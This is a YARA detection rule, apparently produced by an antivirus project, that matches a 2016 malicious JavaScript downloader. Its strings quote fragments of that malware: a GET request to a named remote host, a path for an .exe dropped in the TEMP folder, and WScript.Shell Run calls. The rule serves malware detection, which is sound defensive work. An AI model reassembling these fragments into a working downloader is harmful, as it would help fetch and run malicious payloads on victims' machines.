rule sig_20160329_fc7f5a4caa6d91b8a63ba799f05be959 {
  meta:
    description = "datamaliciousorder - file 20160329_fc7f5a4caa6d91b8a63ba799f05be959.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "666b143c5ea453662274e736cf602e31aa44ee34c561fd07d698e47918b531ad"

  strings:
    $s1  = "G1[hj](\"GET\", \"http://pasticceriabonci.com/n4usj\", false);" fullword ascii
    $s2  = "function xm() {return s[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"Pbno2qfpRP.exe\";};" fullword ascii
    $s3  = "for (;;){WScript[F](G() * 11); if (G1[\"readystate\"] >= 2 * 2) break;};" fullword ascii
    $s4  = "var s = function B() {return WScript[MF](\"WScript.Shell\");}(), w = 11;" fullword ascii
    $s5  = "function ar(kM, R){c = c * 1; return kM - R;};" fullword ascii
    $s6  = "function L(){return \"\" + L0;};" fullword ascii
    $s7  = "function G0(C){s[\"Run\"](C, c, c);};" fullword ascii
    $s8  = "function u() {return ((D == true) && (D == c0)) ? 1 : c;};" fullword ascii
    $s9  = "function wZ()" fullword ascii
    $s10 = " while (Fo){" fullword ascii
    $s11 = "return ar(zB, Yd);" fullword ascii
    $s12 = "var i = new this[\"Date\"]();" fullword ascii
    $s13 = "function G(){return 22;};" fullword ascii
    $s14 = "function O(o) {var M = (1, 2, 3, 4, 5, o); return M;};" fullword ascii
    $s15 = "function Hg(){return MF;};" fullword ascii
    $s16 = "var c0 = false;" fullword ascii
    $s17 = "var WK = false;" fullword ascii
    $s18 = "c0 = true; " fullword ascii
    $s19 = "} catch(cM0){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}